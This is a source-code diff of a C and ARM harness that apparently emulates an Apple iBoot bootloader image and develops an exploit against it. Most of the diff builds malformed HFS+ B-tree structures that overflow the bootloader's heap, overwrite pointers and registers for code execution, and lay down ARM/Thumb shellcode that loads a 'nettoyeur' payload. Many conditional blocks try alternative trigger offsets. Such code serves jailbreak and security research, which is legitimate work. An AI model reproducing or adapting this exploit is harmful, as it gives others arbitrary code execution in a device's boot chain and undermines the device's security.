@@ -1,85 +1,62 @@
-#define IMAGE_NAME        "iBoot.n90bap.RELEASE.dec" //need to have this in the same folder of the exec
-#define IMAGE_START        0x5FF00000 //yes
-#define IMAGE_END          0x5FF50004 //yes
-#define IMAGE_SIZE         (IMAGE_END - IMAGE_START)
-#define IMAGE_HEAP_SIZE        0xA6FFC //should be right
-#define IMAGE_BSS_START        0x5FF41640 //yes
-#define IMAGE_BSS_END          0x5FF50004 //yes
-#define IMAGE_TEXT_END        0x5FF50000 /* XXX this is a lie */
-#define IMAGE_STACK_SIZE    0x1000 //todo
-#define IMAGE_LOADADDR        0x40000000 //yes
-#define IMAGE_HUGECHUNK        0x3000000 //yes
+#define IMAGE_NAME              "iBoot.n90bap.RELEASE.dec"
+#define IMAGE_START             0x5FF00000 //yes
+#define IMAGE_END               0x5FF50004 //yes
+#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
+#define IMAGE_HEAP_SIZE         0xA6FFC //should be right
+#define IMAGE_BSS_START         0x5FF41640 //yes
+#define IMAGE_TEXT_END          0x5FF41000 /* XXX this is a lie */
+#define IMAGE_STACK_SIZE        0x1000 //todo
+#define IMAGE_LOADADDR          0x40000000 //yes
+#define IMAGE_HUGECHUNK         0x3000000 //yes
 
 
-#define breakpoint1_ADDR    (0x17850 + 1) /* ResolvePathToCatalogEntry */ //yes
+#define breakpoint1_ADDR        (0x178C4 + 1) /* ResolvePathToCatalogEntry */ //yes
 
-#define fuck1_ADDR        (0x18726 + 1) //yes1
-#define fuck2_ADDR        (0x1873C + 1) //yes1
-#define fuck3_ADDR        (0x18852 + 1) //yes1
+#define fuck1_ADDR              (0x18726 + 1) //yes1
+#define fuck2_ADDR              (0x1873C + 1) //yes1
+#define fuck3_ADDR              (0x18852 + 1) //yes1
 
-#define wait_for_event_ADDR    (0x00814) //yes
-#define hugechunk_ADDR        (0x00CAE + 1) //yes
-#define gpio_pin_state_ADDR    (0x02694 + 1) //yes
-#define gpio_set_state_ADDR    (0x026BC + 1) //yes
-#define get_timer_us_ADDR    (0x094DC + 1) //yes
-#define reset_cpu_ADDR        (0x095A0 + 1) //yes
-#define readp_ADDR        (0x184EC + 1) //yes
-#define get_mem_size_ADDR    (0x14D14 + 1) //yes
-#define putchar_ADDR        (0x31B78 + 1) //yes
-#define adjust_stack_ADDR    (0x1D6E0 + 1) //yes
-#define adjust_environ_ADDR    (0x1DB14 + 1) //yes
-#define disable_interrupts_ADDR    (0x32884 + 1) //yes
-#define cache_stuff_ADDR    (0x20300 + 1) //yes
-#define wtf_ADDR        (0x????? + 1) //???
+#define wait_for_event_ADDR     (0x00814) //yes
+#define hugechunk_ADDR          (0x00CAE + 1) //yes
+#define gpio_pin_state_ADDR     (0x02694 + 1) //yes
+#define gpio_set_state_ADDR     (0x026BC + 1) //yes
+#define get_timer_us_ADDR       (0x094DC + 1) //yes
+#define reset_cpu_ADDR          (0x095A0 + 1) //yes
+#define readp_ADDR              (0x184EC + 1) //yes
+#define get_mem_size_ADDR       (0x14D14 + 1) //yes
+#define putchar_ADDR            (0x31B78 + 1) //yes
+#define adjust_stack_ADDR       (0x1D6E0 + 1) //yes
+#define adjust_environ_ADDR     (0x1DB14 + 1) //yes
+#define disable_interrupts_ADDR (0x32884 + 1) //yes
+#define cache_stuff_ADDR        (0x20300 + 1) //yes
+#define wtf_ADDR                (0x????? + 1) //???
 
-#define iboot_warmup_ADDR    (0x00110) //yes
-#define iboot_start_ADDR    (0x00BD0 + 1) //yes
-#define main_task_ADDR        (0x00C3C + 1) //yes
-#define panic_ADDR        (0x1E928 + 1) //yes
-#define system_init_ADDR    (0x1EA14 + 1) //yes
-#define task_create_ADDR    (0x1F044 + 1) //yes
-#define task_start_ADDR        (0x1F1A4 + 1) //yes
-#define task_exit_ADDR        (0x1F1C8 + 1) //yes
-#define printf_ADDR        (0x313E0 + 1) //yes
-#define malloc_ADDR        (0x18508 + 1) //yes
-#define free_ADDR        (0x185BC + 1) //yes
-#define create_envvar_ADDR    (0x16E2C + 1) //yes
-#define bcopy_ADDR        (0x31E64) //yes
+#define iboot_warmup_ADDR       (0x00110) //yes
+#define iboot_start_ADDR        (0x00BD0 + 1) //yes
+#define main_task_ADDR          (0x00C3C + 1) //yes
+#define panic_ADDR              (0x1E928 + 1) //yes
+#define system_init_ADDR        (0x1EA14 + 1) //yes
+#define task_create_ADDR        (0x1F044 + 1) //yes
+#define task_start_ADDR         (0x1F1A4 + 1) //yes
+#define task_exit_ADDR          (0x1F1C8 + 1) //yes
+#define printf_ADDR             (0x313E0 + 1) //yes
+#define malloc_ADDR             (0x18508 + 1) //yes
+#define free_ADDR               (0x185BC + 1) //yes
+#define create_envvar_ADDR      (0x16E2C + 1) //yes
+#define bcopy_ADDR              (0x31E64) //yes
 #define decompress_lzss_ADDR    (0x23260 + 1) //yes
-/*
-struct list_node {
-    struct list_node *prev;
-    struct list_node *next;
-}
 
-struct task {
-    char start[4]; //0x0, =0x7461736b, ("task", in viewer is "ksat")
-    uint32_t u1; //0x4, =0x5ff41348
-    uint32_t u2; //0x8, =*0x5ff4134c =0x5ff41348
-    struct list_node queue; //0xC
-    uint32_t state; //0x14
-    uint32_t irq_disable_count; //0x18
-    unsigned char u3[0x150];
-    struct list_node waiter; //0x16C
-    unsigned char u4[0xC];
-    void *stack_ptr; //0x180, points to a structure of "stak" (in viewer is "kats") strings concatenated
-    uint32_t stack_len; //0x184, fixed size of 0x1C00
-    char name[0x10]; //0x188
-    uint32_t task_id; //0x198
-    char end[4]; //0x19C, =0x74736b32 ("tsk2", in viewer is "2kst")
-};
-*/
 void NAKED
 my_breakpoint1(void)
 {
 #ifdef __arm__
     __asm volatile (
-    /* debug */
-    BCALL(my_breakpoint1_helper)
-    /* replacement insn */
-    "ldrb r4, [r11];"
-    /* return */
-    "bx lr;"
+        /* debug */
+        BCALL(my_breakpoint1_helper)
+        /* replacement insn */
+        "ldrb r4, [r11];"
+        /* return */
+        "bx lr;"
     );
 #endif /* __arm__ */
 }
@@ -91,12 +68,13 @@ real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
 {
     register unsigned int r8 __asm("r8");
     register unsigned int sp __asm("r11");
-    //=0x47F20 -> static u_int32_t free_mem;
-    //probably looking for static static char gBootPResponse[0x12C];
+    //0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap;
     if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
         unsigned int t2 = (uintptr_t)image + 0x447A0 + 0x28 + r3 * 4;
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
         dumpfile("DUMP_z1");
+    }else{
+        //fprintf(stderr, "_memalign: sp = 0x%x\n", sp);
     }
     (void)(r0 && r1 && r2);
 }
@@ -106,6 +84,7 @@ real_fuck2(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
 {
     register unsigned int r9 __asm("r9");
     register unsigned int sp __asm("r11");
+    //0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap;
     if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
 #define ULAT(x) (((x) & 0xFFFFF) + IMAGE_START)
         unsigned int t4 = r2 - 0x40;
@@ -123,6 +102,7 @@ real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
 {
     register unsigned int r8 __asm("r8");
     register unsigned int sp __asm("r11");
+    //0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap;
     if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
         dumpfile("DUMP_z3");
@@ -146,7 +126,7 @@ fuck1(void)
         "blx    _real_fuck1;"
         "pop    { r0-r12 };"
         "mov    sp, r11;"
-        "add    r6, r4, #0x3f;" //todo
+        "add    r6, r4, #0x3f;"
         "bx     r10;"
     );
 #endif /* __arm__ */
@@ -168,7 +148,7 @@ fuck2(void)
         "blx    _real_fuck2;"
         "pop    { r0-r12 };"
         "mov    sp, r11;"
-        "sub    r4, r2, #0x40;" //todo
+        "sub    r4, r2, #0x40;"
         "bx     r10;"
     );
 #endif /* __arm__ */
@@ -225,7 +205,7 @@ void
 my_adjust_environ(void)
 {
 #if 0
-    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/disk.dmg", 0);
+    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/disk.dmg", 0);
 #endif
 }
 
@@ -291,9 +271,9 @@ suck_sid(void)
 int
 my_readp(void *ih, void *buffer, long long offset, int length)
 {
-#define TREEDEPTH 0 //works
-#define TRYFIRST 0
-#define TRYLAST 1 //works
+#define TREEDEPTH 0 //no recursion, need to investigate this
+#define TRYFIRST 1 //recursion works
+#define TRYLAST 0
     long long off;
     eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
 #if TRYLAST
@@ -305,7 +285,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     assert(off == offset);
     length = read(rfd, buffer, length);
 #if TREEDEPTH || TRYFIRST || TRYLAST
-#define NODE_SIZE (4096 * 4)
+#define NODE_SIZE (0x400 * 4 * 4) //todo
 #define TOTAL_NODES (0xFFF)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
 #define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
@@ -344,6 +324,8 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_BE(buffer, 16, 3);            /* BTHeaderRec::rootNode */
 #endif
                 memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
+                //starting from free_nodes
+                
                 break;
             case 2:
                 memset(buffer, 'F', length);
@@ -353,21 +335,27 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_BE(buffer, 16, 0x500);            /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
                 PUT_WORD_LE(buffer, 20, 0);                /* must be zero (see above) */
                 PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
-                
-#if 1
+#if 0
 #define START_OF_BTREE_HEADER 0x44594 //useless
-#define START_OF_EXTENTS_BTREE_HEADER 0x44694
-#define ALIGNED_POINTER_OFFSET START_OF_EXTENTS_BTREE_HEADER + 0x14
+#define START_OF_EXTENTS_BTREE_HEADER START_OF_BTREE_HEADER + 0x100 //0x44694
+#define ALIGNED_POINTER_OFFSET START_OF_EXTENTS_BTREE_HEADER + 0x2C //todo
 #define START_OF_SHELLCODE 0x446F0
-#endif
                 
-                PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
-                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */
-                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x446F1);    /* r10 (code exec) */ //yes
-                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x446EC);    /* r11 -> lr */ //tocheck
+                //bins (more or less) is at offset 0x447A0 (!!!)
+                //first bin is at 0x447A0 + 0x28 = 0x447C8
+                //diff is 0x134
+                
+                PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */ //this is a store
+                
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */ //todo >> 6 //this is a store
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + START_OF_SHELLCODE + 1);    /* r10 (code exec) */ //todo, 0x446F1 is right?
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x446EC);    /* r11 -> lr */ //todo
 #if 0
                 PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
 #else
+                
+                /* SHEELCODE */
+                
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   0 - START_OF_EXTENTS_BTREE_HEADER, INSNW_LDR_SP_PC72);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   4 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE +  4, disable_interrupts_ADDR - 1));
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +   8 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(4, 68));
@@ -403,6 +391,9 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 104 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47d3c /* nettoyeur compressed */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
+                
+                /* END */
+#endif
 #endif
                 break;
 #if TREEDEPTH
@@ -414,12 +405,15 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                     ((unsigned char *)buffer)[8] = -(((unsigned char *)buffer)[9] == 1);    /* BTNodeDescriptor::kind */
                     oldpos = offset;
                 } else if (oldpos) {
+                    //this gets triggered always on the second call of the "loop"
+                    //this actually trashes what is copied at line 284
                     lseek(rfd, oldpos, SEEK_SET);
                     read(rfd, buffer, length);
                     oldpos = 0;
-#if 0
+#if 1
                     if (seq == 1 * 3 + 1) {
                         PUT_DWORD_BE(buffer, 32, 0x10000);
+                        eprintf("***TRIGGERING***\n");
                         break;
                     }
 #elif 0
@@ -437,9 +431,99 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                         PUT_DWORD_BE(buffer, 56, 0x10000);
                         break;
                     }
-#elif 1
+#elif 0
                     if (seq == 5 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 56, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 6 * 3 + 1) {
                         PUT_DWORD_BE(buffer, 68, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 7 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 68, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 8 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 80, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 9 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 80, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 10 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 92, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 11 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 92, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 12 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 104, 0x10000);
+                        break;
+                    }
+#elif 1
+                    if (seq == 13 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 116, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 14 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 116, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 15 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 116, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 16 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 128, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 17 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 128, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 18 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 140, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 19 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 140, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 20 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 152, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 21 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 152, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 22 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 164, 0x10000);
+                        break;
+                    }
+#elif 0
+                    if (seq == 23 * 3 + 1) {
+                        PUT_DWORD_BE(buffer, 176, 0x10000);
                         break;
                     }
 #endif
@@ -558,70 +642,70 @@ dispatch(int signum, void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
 {
 #if USE_SIGNAL > 1
     if (signum == ILLNO) {
-    if ((tctx->__cpsr & 0x20) == 0 && *(uint32_t *)si_addr == INSNA_ILLEGAL) {
-        /* ARM handlers: tctx->__pc += 4; */
-        uintptr_t addr = (unsigned char *)si_addr - image;
-        switch (addr) {
-        case wait_for_event_ADDR:
-            my_wait_for_event();
+        if ((tctx->__cpsr & 0x20) == 0 && *(uint32_t *)si_addr == INSNA_ILLEGAL) {
+            /* ARM handlers: tctx->__pc += 4; */
+            uintptr_t addr = (unsigned char *)si_addr - image;
+            switch (addr) {
+            case wait_for_event_ADDR:
+                my_wait_for_event();
+            }
+        } else if ((tctx->__cpsr & 0x20) != 0 && *(uint16_t *)si_addr == INSNT_ILLEGAL) {
+            /* Thumb handlers: tctx->__pc += 2; */
+            uintptr_t addr = (unsigned char *)si_addr - image + 1;
+            switch (addr) {
+            case cache_stuff_ADDR:
+                my_cache_stuff();
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case hugechunk_ADDR:
+                tctx->__r[0] = (uint32_t)gethuge();
+                tctx->__pc += 4;
+                return 0;
+            case gpio_pin_state_ADDR:
+                tctx->__r[0] = my_gpio_pin_state(tctx->__r[0]);
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case gpio_set_state_ADDR:
+                my_gpio_set_state(tctx->__r[0], tctx->__r[1]);
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case get_timer_us_ADDR:
+                *(uint64_t *)(&tctx->__r[0]) = my_get_timer_us();
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case reset_cpu_ADDR:
+                my_reset_cpu();
+            case readp_ADDR:
+                tctx->__r[0] = my_readp((void *)tctx->__r[0], (void *)tctx->__r[1], *(uint64_t *)(&tctx->__r[2]), *(uint32_t *)tctx->__sp);
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case get_mem_size_ADDR:
+                tctx->__r[0] = my_get_mem_size();
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case putchar_ADDR:
+                putchar(tctx->__r[0]);
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case adjust_stack_ADDR:
+                my_adjust_stack();
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case adjust_environ_ADDR:
+                my_adjust_environ();
+                tctx->__pc = tctx->__lr;
+                return 0;
+            case breakpoint1_ADDR:
+                my_breakpoint1_helper(tctx->__r[0], tctx->__r[1], tctx->__r[2], tctx->__r[3], tctx->__sp, tctx->__lr);
+                tctx->__r[4] = *(unsigned char *)tctx->__r[11];
+                tctx->__pc += 4;
+                return 0;
+            }
         }
-    } else if ((tctx->__cpsr & 0x20) != 0 && *(uint16_t *)si_addr == INSNT_ILLEGAL) {
-        /* Thumb handlers: tctx->__pc += 2; */
-        uintptr_t addr = (unsigned char *)si_addr - image + 1;
-        switch (addr) {
-        case cache_stuff_ADDR:
-            my_cache_stuff();
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case hugechunk_ADDR:
-            tctx->__r[0] = (uint32_t)gethuge();
-            tctx->__pc += 4;
-            return 0;
-        case gpio_pin_state_ADDR:
-            tctx->__r[0] = my_gpio_pin_state(tctx->__r[0]);
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case gpio_set_state_ADDR:
-            my_gpio_set_state(tctx->__r[0], tctx->__r[1]);
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case get_timer_us_ADDR:
-            *(uint64_t *)(&tctx->__r[0]) = my_get_timer_us();
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case reset_cpu_ADDR:
-            my_reset_cpu();
-        case readp_ADDR:
-            tctx->__r[0] = my_readp((void *)tctx->__r[0], (void *)tctx->__r[1], *(uint64_t *)(&tctx->__r[2]), *(uint32_t *)tctx->__sp);
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case get_mem_size_ADDR:
-            tctx->__r[0] = my_get_mem_size();
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case putchar_ADDR:
-            putchar(tctx->__r[0]);
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case adjust_stack_ADDR:
-            my_adjust_stack();
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case adjust_environ_ADDR:
-            my_adjust_environ();
-            tctx->__pc = tctx->__lr;
-            return 0;
-        case breakpoint1_ADDR:
-            my_breakpoint1_helper(tctx->__r[0], tctx->__r[1], tctx->__r[2], tctx->__r[3], tctx->__sp, tctx->__lr);
-            tctx->__r[4] = *(unsigned char *)tctx->__r[11];
-            tctx->__pc += 4;
-            return 0;
-        }
-    }
     }
 #endif /* USE_SIGNAL > 1 */
     if (signum == SIGSEGV) {
-    return dispatch_SEGV(si_addr, tctx);
+        return dispatch_SEGV(si_addr, tctx);
     }
     return -1;
 }
@@ -669,14 +753,14 @@ patch_image(unsigned char *image)
     /* pretend we have nand device? */
     *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1; //yes
     *(uint32_t *)(image + 0x18122) = INSN2_MOV_R0_1__MOV_R0_1; //yes
-
+#if DEBUG_MALLOC
     /* make main_task show SP */
     *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13); //yes
     *(uint8_t *)(image + 0x32CA4) = 'x'; //yes
     /* show task structure */
     *(void **)(image + 0xFA4) = image + 0x41330; //yes
     *(uint8_t *)(image + 0x32C90) = 'x'; //yes
-
+#endif
     /* nop NAND */
     *(uint32_t *)(image + 0x1D940) = INSN2_NOP__NOP; //yes
     /* nop 0x832000xx (boot failure count) */
